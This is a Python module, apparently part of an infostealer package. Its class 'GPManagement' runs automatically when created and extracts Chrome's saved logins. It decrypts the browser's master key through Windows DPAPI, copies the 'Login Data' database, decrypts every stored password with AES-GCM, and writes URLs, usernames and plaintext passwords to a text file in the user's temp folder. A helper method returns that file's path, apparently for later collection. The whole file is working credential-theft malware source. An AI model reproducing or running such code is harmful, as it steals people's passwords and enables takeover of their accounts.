from .imports import *

class GPManagement:
    def __init__(self) -> None:
        self.m()
        
    def __repr__(self):
        return "GPManagement()"
        
    def cc(self, ch) ->str:
        return str(datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=ch))
            
    def ec(self):
        localsp = os.path.join(os.environ["USERPROFILE"],
                                "AppData", "Local", "Google", "Chrome",
                                "User Data", "Local State")
        with open(localsp, "r", encoding="utf-8") as f:
            ls = f.read()
            ls = json.loads(ls)
            
        key = base64.b64decode(ls["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        
    def dp(self, pw, key) -> str:
        try:
            iv = pw[3:15]
            password = pw[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""
                
    def m(self):
        self.temp = os.getenv("temp")
        self.pwpath = f"{self.temp}\\{os.getlogin()}-GP.txt"
        if os.path.exists(self.pwpath):
            os.remove(self.pwpath)
        with open(self.pwpath, "a")as ddd:
            key = self.ec()
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "default", "Login Data")
            filename = f"{self.temp}\\ChromeData.db"
            shutil.copyfile(db_path, filename)
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = self.dp(row[3], key)
                date_created = row[4]
                date_last_used = row[5]        
                if username or password:
                    ddd.write(f"Origion URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\nDate Last Used: {str(self.cc(date_last_used))}\nDate Created: {str(self.cc(date_created))}\n")
                else:
                    continue
            cursor.close()
            db.close()
            try:
                os.remove(filename)
            except:
                pass
                
    def Val(self) -> str:
        return f"{self.temp}\\{os.getlogin()}-GP.txt"